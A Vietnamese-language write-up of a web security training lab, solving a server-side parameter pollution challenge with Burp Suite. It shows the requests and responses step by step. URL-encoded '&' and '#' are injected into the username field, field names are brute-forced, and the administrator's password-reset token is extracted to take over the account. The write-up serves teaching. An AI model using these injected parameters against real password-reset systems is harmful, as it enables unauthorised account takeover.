# **Lab: Exploiting server-side parameter pollution in a query string**

>  To solve the lab, log in as the `administrator` and delete `carlos`. 

# **Solution**

Kích hoạt chức năng `Forgot password`. Sử dụng để lấy lại mật khẩu tài khoản `administrator`.

```
Please check your email: "*****@normal-user.net" 
```

Okey, chuyển sang giao diện Burpsuite, gửi request vừa rồi tới Repeater.

```
# request

POST /forgot-password HTTP/2
Host: 0a9c00d904d940b880e4da55002a001f.web-security-academy.net
Cookie: session=3jMzCy8ntjeD7V56NuUu01HUaS4eBA8v
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a9c00d904d940b880e4da55002a001f.web-security-academy.net/forgot-password
Content-Type: x-www-form-urlencoded
Content-Length: 79
Origin: https://0a9c00d904d940b880e4da55002a001f.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

csrf=UzYS5AyaWmfOj8u11EuIHMdEweA9yxXN&username=administrator
```

```
# response

HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 49

{"type":"email","result":"*****@normal-user.net"}
```

Chúng ta có req và res gốc.  
Ở req gốc, thay dổi giá trị `username` thành một tên ngẫu nhiên:

```
# req

username=administrator_random
```

```
# res

HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 61

{"type":"ClientError","code":400,"error":"Invalid username."}
```

Ở đây thấy res đã khác đi, có chứa thông báo `"Invalid username."`.  

Vậy nghĩa là việc sửa đổi req đang có tác dụng và có mã lỗi rõ ràng trả về.  

Tiếp tục thay đổi req:

```
# req

username=administrator%23
```

Ở đây `%23` là `#` đã được mã hóa. Mục đích nhằm thử cắt bớt yêu cầu phía máy chủ.

```
# res

HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 33

{"error": "Field not specified."}
```

`"Field not specified."`. Chứng tỏ việc cắt bớt (truncate) yêu cầu thành công và gây ra lỗi tới phía máy chủ.  
Và thông báo trên cũng cho thấy có thể có một tham số phía sau `username` là `field` đã bị cắt bỏ bởi `#`.  

Giờ hãy thử thêm tham số `field`.

```
# req

username=administrator%26field=x%23
```

> %26 -> &  
%23 -> #

```
# res

HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 58

{"type":"ClientError","code":400,"error":"Invalid field."}
```

Trong req, ta tự thêm tham số field và gán giá trị cho nó, kết quả ở res cho thấy `"Invalid field."`, tức là việc thêm `field` là đúng. Lỗi gây ra do field mình tự định danh không tồn tại. Đồng nghĩa với việc hành động chèn thêm tham số là thành công.

Giờ gửi req vừa test tới `Intruder`. Thực hiện bruteforce để tìm ra giá trị chính xác của tham số `field`.

Chọn `Attack type` là `Sniper` và `Payload type: Simple list`, `Payload` chọn `Server-side variable names`. 

Sau khi `"Attack"`, ta lọc những res có code là 200. Đó là những res của req mà có `field` hợp lệ.  
Ta xác định được 2 `field` hợp lệ là `email` và `username`

```
# res

{"type":"email","result":"*****@normal-user.net"}

{"type":"username","result":"administrator"}
```

Tiếp theo quay lại `Proxy History` tab, ta thấy request `GET /static/js/forgotPassword.js HTTP/2` có endpoint là của chức năng reset password.  
Trong response trả về ta thấy:

```
# code inside res function reset password

forgotPwdReady(() => {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?reset_token=${resetToken}`;
    }
    else
    {
        const forgotPasswordBtn = document.getElementById("forgot-password-btn");
        forgotPasswordBtn.addEventListener("click", displayMsg);
    }
}
);
```

Phân tích đoạn code trên ta thấy chức năng reset password có tham số `reset-token`.  
Đoán rằng reset-token được yêu cầu để reset mật khẩu của một tài khoản nào đó. Và cần gửi giá trị `reset_token` kèm theo với `username` để reset mật khẩu.  

```
# req

username=administrator%26field=reset_token%23
```

```
# res

HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 66

{"type":"reset_token","result":"0tktbvsrprv6tnv1aluyk48csx0ond4w"}
```

Perfect!! Vậy là thành công lấy được `reset-token`.  

Dựa theo phần code chức năng reset password:  

```
if (resetToken)
    {
        window.location.href = `/forgot-password?reset_token=${resetToken}`;
    }
```

Giờ quay lại browser và nhập url:

```
https://0a53009f040b3280834e64f000e9001f.web-security-academy.net/forgot-password?reset_token=0tktbvsrprv6tnv1aluyk48csx0ond4w
```

Nice, thành công truy cập và reset mật khẩu `administrator`. Việc cuối cùng là đăng nhập và làm việc phải làm thôi:)

![image](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRjBeuCGEk2eQqynMRhby-1iuvHJfqajeA0oA&s)